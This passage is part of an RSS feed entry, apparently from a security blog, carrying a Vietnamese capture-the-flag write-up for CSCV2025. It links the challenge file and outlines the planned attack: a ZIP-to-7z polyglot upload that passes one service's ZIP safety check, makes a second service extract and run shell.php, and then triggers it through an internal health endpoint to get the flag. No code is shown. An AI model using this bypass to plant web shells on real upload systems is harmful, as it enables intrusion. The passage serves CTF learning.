challenge file: &lt;a
href="https://drive.google.com/file/d/1PprDuWV1u11dnH1mf_Bc70La8CpFZ7NR/view"
target="_blank"
&gt;public&lt;/a&gt;&lt;/p&gt;
&lt;h3 class="relative group"&gt;IDEA: Polyglot ZIP→7z + kích hoạt qua “health” nội bộ
&lt;div id="idea-polyglot-zip7z--kích-hoạt-qua-health-nội-bộ" class="anchor"&gt;&lt;/div&gt;
&lt;span
class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"&gt;
&lt;a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#idea-polyglot-zip7z--k%c3%adch-ho%e1%ba%a1t-qua-health-n%e1%bb%99i-b%e1%bb%99" aria-label="Anchor"&gt;#&lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;
&lt;p&gt;Mục tiêu: Upload 1 file vượt qua kiểm tra &lt;code&gt;ZIP safety&lt;/code&gt; của &lt;code&gt;service 1&lt;/code&gt; nhưng buộc &lt;code&gt;service 2&lt;/code&gt; giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.&lt;/p&gt;</description><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://mtasecurity.github.io/MSEC/web/1761292219022-abc/featured.png"/></item></channel></rss>